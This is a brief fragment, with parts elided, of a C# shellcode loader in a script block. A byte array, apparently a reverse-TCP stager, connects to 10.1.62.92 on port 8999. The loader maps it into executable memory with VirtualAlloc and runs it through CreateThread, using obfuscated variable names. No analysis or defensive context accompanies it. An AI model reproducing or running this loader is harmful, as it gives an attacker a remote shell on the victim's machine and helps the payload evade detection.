...
0x68,0x0a,0x01,0x3e,0x5c,0x68,0x02,0x00,0x23,0x27,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr gj_XhZz = VirtualAlloc(IntPtr.Zero,(UIntPtr)ehECMAkhY7.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(ehECMAkhY7,0,gj_XhZz,ehECMAkhY7.Length);
        IntPtr xtF5Ty = IntPtr.Zero;
        IntPtr reKkRzMXl = CreateThread(IntPtr.Zero,UIntPtr.Zero,gj_XhZz,IntPtr.Zero,0,ref xtF5Ty);
    }
</script>
